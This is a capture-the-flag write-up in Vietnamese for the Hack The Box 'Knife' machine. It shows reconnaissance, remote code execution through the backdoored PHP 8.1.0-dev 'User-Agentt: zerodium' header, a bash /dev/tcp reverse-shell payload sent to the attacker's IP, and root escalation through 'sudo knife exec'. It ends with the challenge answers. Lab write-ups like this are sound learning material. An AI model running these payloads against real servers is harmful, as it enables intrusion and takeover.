![image](https://hackmd.io/_uploads/H1FsGxnFA.png)

# Machine info and Comment
## Machine info
Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.

## Comment


# Recon
## nmap 
Sau khi nmap ta thấy nó scan được **2** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -n 10.10.10.242                                                            
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 10:52 EDT
Nmap scan report for 10.10.10.242
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.87 seconds
```
Từ đây, ta sẽ scan tiếp 2 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.10.242                                                         
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 10:55 EDT
Nmap scan report for 10.10.10.242
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
```
## Wappalyzer

![image](https://hackmd.io/_uploads/BkMTcDRFA.png)

Từ công cụ này ta biết được web này sử dụng PHP với phiên bản **8.1.0**. Đây là phiên bản có lỗ hổng nghiêm trọng dẫn đến [RCE](https://www.exploit-db.com/exploits/49933) ở header **User-Agent**

![image](https://hackmd.io/_uploads/rk5-owCFR.png)

## 8.1.0-dev PHP
Khi dùng Burp ta cũng có thể thấy được phiên bản đầy đủ của nó là gì

![image](https://hackmd.io/_uploads/r112pPAFA.png)

**PHP 8.1.0-dev** version được phát hành có backdoor. Nếu phiên bản PHP này chạy trên máy chủ, kẻ tấn công có thể thực thi mã tùy ý bằng cách gửi header **User-Agentt**.

Hai commits độc hại đã được push tới kho lưu trữ code PHP Git của người tạo PHP

Trong các commit độc hại, kẻ tấn công đã lợi dụng “sửa lỗi đánh máy”

![image](https://hackmd.io/_uploads/H14sRvRKR.png)

Khi nhìn vào dòng 370 được thêm vào trong đó hàm `zend_eval_string` được gọi, mã này thực sự tạo ra một backdoor để có được RCE dễ dàng trên  web. Dòng này thực thi mã PHP từ bên trong header HTTP của useragent, nếu chuỗi bắt đầu bằng ‘zerodium’.

Zerodium là một công ty bảo mật có trụ sở tại Washington chuyên mua bán các lỗ hổng zero-day cho nhiều hệ điều hành cũng như các ứng dụng Web và máy tính để bàn phổ biến, bao gồm cả chính PHP.

# User flag
## Exploit
### Inject code and Reverse shell
Từ các hoạt động recon ở trên, ta sẽ gửi Request bằng Burp với header 

`User-Agentt: zerodium system("whoami");`

![image](https://hackmd.io/_uploads/HkfRkdAYR.png)

Gửi 1 reverse shell sau đó mở port để nghe
```
User-Agentt: zerodium system("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.93/1234 0>&1'");
```
![image](https://hackmd.io/_uploads/H1uoW_RtR.png)

`whoami` biết được tên user là **james**

## Post-Exploit
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.93] from (UNKNOWN) [10.10.10.242] 48812
whoami
james
cat /home/james/user.txt
267f08275103f86a4a*****
```
# Root flag
## Exploit
### sudo -l
```
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

[GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo) có hỗ trợ ta thực hiện lệnh này

![image](https://hackmd.io/_uploads/HyXafORF0.png)

## Post-Exploit
Sử dụng lệnh sau
```
sudo knife exec -E 'exec "/bin/sh"'
whoami
root
```
Từ đây ta có thể hoàn thành máy bằng cách đọc file `root.txt`
```
cat /root/root.txt
3dd90c5f868adca9b******
```
# Result
1. How many TCP ports are open on Knife? --> 2
2. What version of PHP is running on the webserver? --> 8.1.0-dev
3. What HTTP request header can be added to get code execution in this version of PHP? --> User-Agentt
4. What user is the web server running as? --> james
5. Submit the flag located in the james user's home directory. --> 267f08275103f86a4a9*******
6. What is the full path to the binary on this machine that james can run as root? --> /usr/bin/knife
7. Submit the flag located in root's home directory. --> 3dd90c5f868adca9************


![image](https://hackmd.io/_uploads/H1ODQOAt0.png)
